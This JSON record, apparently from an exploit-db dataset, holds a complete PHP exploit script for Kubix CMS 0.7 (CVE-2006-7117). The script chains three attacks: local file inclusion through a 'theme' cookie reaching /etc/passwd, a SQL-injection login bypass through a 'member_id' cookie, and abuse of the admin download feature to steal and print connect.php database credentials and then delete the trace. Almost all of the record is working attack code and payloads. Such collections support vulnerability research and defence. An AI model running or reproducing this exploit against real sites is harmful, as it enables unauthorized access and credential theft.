{
  "id": "2863",
  "title": "kubix 0.7 - Multiple Vulnerabilities",
  "cve": "CVE-2006-7117",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/php -q -d short_open_tag=on\r\n<?\r\necho \"\\r\\n\";\r\necho \"Kubix <=0.7 Multiple Vulnerabilities Exploit\\r\\n\";\r\necho \"Site: http://www.kubixproject.net\\r\\n\";\r\necho \"Dork: Powered by: Kubix\\r\\n\";\r\necho \"by BlackHawk <hawkgotyou@gmail.com>\\r\\n\";\r\necho \"Thanks to rgod for the php code and Marty for the Love\\r\\n\\r\\n\";\r\nif ($argc<4) {\r\necho \"Usage: php \".$argv[0].\" Site Path AttackType Related\\r\\n\";\r\necho \"Host:\t\ttarget server (ip/hostname)\\r\\n\";\r\necho \"Path:\t\tpath to Kubix\\r\\n\";\r\necho \"AttackType:\t1 - Local File Inclusion (mq=off)\\r\\n\";\r\necho \"\t\t  |-> Related: path of the file to include\\r\\n\";\r\necho \"\t\t  |-> Es: php \".$argv[0].\" localhost /kubix/ 1 ../../../../../etc/passwd\\r\\n\\r\\n\";\r\necho \"\t\t2 - Login Bypass (PoC)\\r\\n\";\r\necho \"\t\t  |-> Related: Valid User ID (do nothing.. only to show how does it works)\\r\\n\";\r\necho \"\t\t  |-> Es: php \".$argv[0].\" localhost /kubix/ 2 1\\r\\n\\r\\n\";\r\necho \"\t\t3 - Download connect.php file\\r\\n\";\r\necho \"\t\t  |-> Related: Valid Admin User ID\\r\\n\";\r\necho \"\t\t  |-> Es: php \".$argv[0].\" localhost /kubix/ 3 1\\r\\n\\r\\n\";\r\necho \"\";\r\necho \"\\r\\n\";\r\necho \"\";\r\ndie;\r\n}\r\n\r\n/*\r\nThere are some critical vulnerabilities in this quite pretty CMS..\r\n\r\nVuln N\u00b0 1 - Local File Inclusion:\r\n\r\nvuln file: includes/head.php\r\ncode:\r\n------\r\nif(isset($_COOKIE['theme']) && $_COOKIE['theme'] != \"\")\r\n{\r\n\t$default_theme = $_COOKIE['theme'];\r\n}\r\n[...]\r\ninclude \"themes/$default_theme/header.php\";\r\n?>\r\n------\r\n\r\nattacker can execute a LocalFile by setting the 'theme' cookie value properly;\r\nEs: ../../../../../../etc/passwd%00\r\nBecasuse of the last null char this one works only with MQ=off\r\n\r\n\r\nVuln N\u00b0 2 - Login Bypass:\r\n\r\nvuln file: includes/functions.php\r\ncode:\r\n------\r\n// If the member_id cookie is set...\r\nif(isset($_COOKIE['member_id']) && $_COOKIE['member_id'] != 0 && $_COOKIE['member_id'] != \"\")\r\n{\r\n\t$id = $_COOKIE['member_id'];\r\n\t$pass_hash = $_COOKIE['pass_hash'];\r\n\r\n\t$sql = mysql_query(\"SELECT name FROM $members WHERE id = $id AND member_login_key = '$pass_hash'\");\r\n\t$numrows = mysql_num_rows($sql);\r\n\r\n\tif($numrows != 1)\r\n\t{\r\n\t\t$isLoggedIn = \"\";\r\n\t}\r\n\telse\r\n\t{\r\n\t\t$isLoggedIn = 1;\r\n\t}\r\n}\r\n------\r\nAttacker can Bypass login by setting 'member_id' cookie value properly and making a SQL Injection attack;\r\n\r\nEs: 1--\r\n\r\nVuln N\u00b0 3 - connect.php (or what you want) file download:\r\n\r\nvuln file: includes/adm/add_dl.php\r\ncode:\r\n------\r\nif(isset($_POST['Submit']) && $_POST['title'] != \"\" && $_POST['file'] != \"\" && $_POST['desc'] != \"\")\r\n\t{\r\n\t\t$title = $_POST['title'];\r\n\t\t$file = $_POST['file'];\r\n\t\t$desc = $_POST['desc'];\r\n\t\t$cat = $_POST['cats'];\r\n\t\t\r\n\t\tif(file_exists(\"Downloads/$file\"))\r\n\t\t{\r\n\t\t\tmysql_query(\"INSERT INTO kbx_downloads (cat, name, `desc`, `file`) VALUES('$cat', '$title', '$desc', '$file')\");\r\n\t\t\techo '<div class=\"container center\">Download added!<br />Redirecting...</div>';\r\n\t\t\techo '<meta http-equiv=\"refresh\" content=\"1;url=adm_index.php?mod=edit_dl\">';\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\techo '<div class=\"alert\">File Doesnt Exist!</div>';\r\n\t\t\techo '<meta http-equiv=\"refresh\" content=\"1;url=adm_index.php?mod=add_dl\">';\r\n\t\t}\r\n\t}\r\n------\r\nAttacker with a valid Admin ID can send a malicious file name to download connect.php;\r\nEs: ../includes/connect.php\r\n\r\n\r\nStarted programming: 15.37 28/11/2006\r\nEnded:\r\n\r\n\r\nsorry for my bad english but i've done it quicly cause Prof. Da Forno probably will defenestrate me in latin tomorrow :D\r\n\r\nBlackHawk <hawkgotyou@gmail.com>\r\n*/\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\nfunction quick_dump($string)\r\n{\r\n  $result='';$exa='';$cont=0;\r\n  for ($i=0; $i<=strlen($string)-1; $i++)\r\n  {\r\n   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))\r\n   {$result.=\"  .\";}\r\n   else\r\n   {$result.=\"  \".$string[$i];}\r\n   if (strlen(dechex(ord($string[$i])))==2)\r\n   {$exa.=\" \".dechex(ord($string[$i]));}\r\n   else\r\n   {$exa.=\" 0\".dechex(ord($string[$i]));}\r\n   $cont++;if ($cont==15) {$cont=0; $result.=\"\\r\\n\"; $exa.=\"\\r\\n\";}\r\n  }\r\n return $exa.\"\\r\\n\".$result;\r\n}\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\nfunction sendpacketii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.$host.':'.$port; die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid proxy...';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo \"Connecting to \".$parts[0].\":\".$parts[1].\" proxy...\\r\\n\";\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n}\r\n\r\n$host=$argv[1];\r\n$path=$argv[2];\r\n$attack_type=$argv[3];\r\n$port=80;\r\n$proxy=\"\";\r\n\r\n\r\nif (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}\r\nif ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n\r\nswitch($attack_type)\r\n{\r\ncase 1: //Local file inclusion\r\n$file_inc=$argv[4];\r\nfor ($i=5; $i<=$argc-1; $i++){\r\n$file_inc.=\" \".$argv[$i];\r\n}\r\n$file_inc = urlencode($file_inc).'%00';\r\necho \"Attack No 1 - Local File Inclusion\\r\\n\";\r\necho \"-- Start of Result--\\r\\n\";\r\n$packet =\"GET \".$p.\"index.php HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Cookie: theme=\".$file_inc.\";\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\necho $html;\r\necho \"\\r\\n-- End of Result--\";\r\nbreak;\r\n\r\ncase 2: // Login Bypass\r\n$usr_id=$argv[4];\r\necho \"Attack No 2 - Login Bypass\\r\\n\";\r\n$packet =\"GET \".$p.\"index.php HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Cookie: member_id=\".$usr_id.\"--;\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\necho \"Logged in.. But this is just a PoC..\";\r\nbreak;\r\n\r\nbreak;\r\ncase 3: // connect.php download\r\n$usr_id=$argv[4];\r\n$data=\"title=DaForno_Imperat\";\r\n$data.=\"&file=../includes/connect.php\";\r\n$data.=\"&desc=BlackHawk_Rulez\";\r\n$data.=\"&Submit=Submit\";\r\n$packet=\"POST \".$p.\"adm_index.php?mod=add_dl HTTP/1.0\\r\\n\";\r\n$packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.$path.\"/blog.php\\r\\n\";\r\n$packet.=\"Accept-Language: it\\r\\n\";\r\n$packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$packet.=\"Accept-Encoding: gzip, deflate\\r\\n\";\r\n$packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Cookie: member_id=\".$usr_id.\"--;\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\";\r\n$packet.=\"Cache-Control: no-cache\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\n$valid_id=0;\r\n\r\nfor ($i=0; $i<=50; $i++){\r\n$packet =\"GET \".$p.\"downloads.php?ID=\".$i.\" HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Cookie: member_id=\".$usr_id.\"--;\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\nif (strstr($html,\"DaForno_Imperat\"))\r\n{\r\n$valid_id=$i;\r\n}\r\n}\r\n$packet =\"GET \".$p.\"downloads.php?act=dl&ID=\".$valid_id.\" HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Cookie: member_id=\".$usr_id.\"--;\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\n$temp=explode(\"<?PHP\",$html);\r\n$temp2=explode(\"?>\",$temp[1]);\r\necho \"<?PHP\\r\\n\".$temp2[0].\"\\r\\n?>\";\r\n$packet =\"GET \".$p.\"adm_index.php?mod=edit_dl&act=del&type=file&ID=\".$valid_id.\" HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Cookie: member_id=\".$usr_id.\"--;\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\necho \"\\r\\n\\r\\n\\r\\nAll Done.. Enjoy..\";\r\nbreak;\r\n}\r\n?>\r\n\r\n# milw0rm.com [2006-11-29]",
  "url": "https://www.exploit-db.com/exploits/2863"
}